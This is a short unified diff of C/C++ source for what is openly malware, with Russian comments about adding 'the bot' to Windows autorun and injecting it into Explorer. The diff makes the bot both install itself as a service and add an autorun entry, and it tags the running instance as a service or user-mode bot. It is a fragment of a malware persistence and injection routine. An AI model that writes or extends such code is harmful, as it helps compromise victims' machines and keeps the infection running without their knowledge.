@@ -105,8 +105,8 @@ void InternalAddToAutorun()
 
 		MDBG("Main", "Добавляем бот в автозагрузку.");
 
-		if (!BOT::InstallService(Name));
-			BOT::AddToAutoRun(Name);
+		BOT::InstallService(Name);
+		BOT::AddToAutoRun(Name);
 		STR::Free(Name);
 	}
 	#endif
@@ -272,7 +272,7 @@ int APIENTRY MyMain()
 	{
 		// Если бот ещё не  запущен, то выполняем инжект в эксплорер
 		WriteLog("Запущен сервис");
-
+		BOT::SetBotType(BotService);
 
 		if (!BOT::IsRunning())
 		{
@@ -283,6 +283,8 @@ int APIENTRY MyMain()
 		BOT::ExecuteService();
 		pExitProcess(0);
 	}
+
+	BOT::SetBotType(BotRing3);
 
 	WriteLog("Стартует бот");
 	WriteLog(Bot->ApplicationName().t_str());
